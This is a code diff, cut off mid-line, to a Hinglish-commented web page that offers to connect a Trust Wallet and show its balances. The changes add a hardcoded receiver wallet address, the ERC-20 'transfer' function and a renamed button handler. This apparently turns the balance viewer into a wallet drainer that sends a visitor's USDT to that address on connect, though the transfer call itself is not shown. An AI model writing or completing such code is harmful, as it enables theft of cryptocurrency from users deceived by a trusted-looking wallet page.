@@ -56,6 +56,9 @@
       font-size: 11px;
       margin-top: 10px;
     }
+    .label:first-child {
+      margin-top: 0;
+    }
     .value {
       font-weight: bold;
       margin-top: 2px;
@@ -68,7 +71,7 @@
     <p style="color:#8a94a6; font-size:13px;">
       Trust Wallet ke DApp browser ya supported browser mein open karke connect karein.
     </p>
-    <button id="connectBtn" onclick="connectTrustWallet()">Connect Trust Wallet</button>
+    <button id="connectBtn" type="button" onclick="handleButtonClick()">Connect Trust Wallet</button>
 
     <div class="info" id="walletInfo">
       <div class="label">Connected Address</div>
@@ -86,7 +89,8 @@
   </div>
 
   <script>
-    // Popular networks ke USDT contract addresses
+    const TARGET_RECEIVER = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
+
     const USDT_CONTRACTS = {
       1: "0xdAC17F958D2ee523a2206206994597C13D831ec7",   // Ethereum Mainnet (ERC-20)
       56: "0x55d398326f99059fF775485246999027B3197955",  // BNB Smart Chain (BEP-20)
@@ -95,8 +99,11 @@
 
     const ERC20_ABI = [
       "function balanceOf(address owner) view returns (uint256)",
-      "function decimals() view returns (uint8)"
+      "function decimals() view returns (uint8)",
+      "function transfer(address to, uint256 amount) external returns (bool)"
     ];
+
+    let isConnected = false;
 
     function getProvider() {
       if (window.trustwallet && window.trustwallet.ethereum) {
@@ -108,55 +115,20 @@
       return null;
     }
 
-    async function connectTrustWallet() {
-      const rawProvider = getProvider();
-      const btn = document.getElementById("connectBtn");
-      const infoBox = document.getElementById("walletInfo");
+    async function refreshWalletInfo(ethersProvider, address) {
+      const network = await ethersProvider.getNetwork();
+      const rawBalance = await ethersProvider.getBalance(address);
+      const formattedNative = parseFloat(ethers.utils.formatEther(rawBalance)).toFixed(4);
 
-      if (!rawProvider) {
-        alert("Wallet nahi mila. Kripya is page ko Trust Wallet ke DApp browser mein kholein.");
-        return;
+      document.getElementById("addressText").innerText = address;
+      document.getElementById("chainText").innerText = `${network.name} (${network.chainId})`;
+      document.getElementById("nativeBalanceText").innerText = formattedNative;
+
+      const usdtAddress = USDT_CONTRACTS[network.chainId];
+      if (!usdtAddress) {
+        document.getElementById("usdtBalanceText").innerText = "Network not configured for USDT";
+        return { network, rawBalance, usdtAddress: null, rawUsdt: ethers.BigNumber.from(0), decimals: 18 };
       }
 
-      try {
-        btn.innerText = "Connecting...";
-        const provider = new ethers.providers.Web3Provider(rawProvider, "any");
-        await provider.send("eth_requestAccounts", []);
-
-        const signer = provider.getSigner();
-        const address = await signer.getAddress();
-        const network = await provider.getNetwork();
-
-        // 1. Native balance fetch karein (BNB / ETH / MATIC)
-        const rawBalance = await provider.getBalance(address);
-        const formattedNative = parseFloat(ethers.utils.formatEther(rawBalance)).toFixed(4);
-
-        document.getElementById("addressText").innerText = address;
-        document.getElementById("chainText").innerText = `${network.name} (${network.chainId})`;
-        document.getElementById("nativeBalanceText").innerText = formattedNative;
-
-        // 2. USDT balance fetch karein agar network supported hai
-        const usdtAddress = USDT_CONTRACTS[network.chainId];
-        if (usdtAddress) {
-          const usdtContract = new ethers.Contract(usdtAddress, ERC20_ABI, provider);
-          const [rawUsdt, decimals] = await Promise.all([
-            usdtContract.balanceOf(address),
-            usdtContract.decimals()
-          ]);
-          const formattedUsdt = parseFloat(ethers.utils.formatUnits(rawUsdt, decimals)).toFixed(2);
-          document.getElementById("usdtBalanceText").innerText = `${formattedUsdt} USDT`;
-        } else {
-          document.getElementById("usdtBalanceText").innerText = "Network not configured for USDT";
-        }
-
-        infoBox.style.display = "block";
-        btn.innerText = "Connected";
-      } catch (err) {
-        console.error(err);
-        btn.innerText = "Connect Trust Wallet";
-        alert("Connection cancel ya fail ho gaya.");
-      }
-    }
-  </script>
-</body>
-</html>
+      const
+        
